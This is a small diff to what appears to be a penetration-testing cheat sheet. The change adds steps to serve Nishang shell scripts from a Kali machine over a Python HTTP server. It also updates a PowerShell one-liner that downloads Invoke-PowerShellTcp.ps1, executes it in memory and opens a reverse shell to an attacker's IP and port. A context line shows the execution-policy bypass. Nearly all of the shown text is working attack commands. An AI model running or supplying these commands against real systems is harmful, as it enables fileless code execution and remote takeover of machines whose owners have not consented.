@@ -30,7 +30,12 @@ powershell -nop -exec Bypass -File revshell.ps1
 
 Execute download direct on memory
 ```
-powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
+cd /opt/nishang/Shells/
+sudo python -m http.server 80
+```
+
+```
+powershell iex (New-Object Net.WebClient).DownloadString('http://<Kali IP>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
 ```
 
 
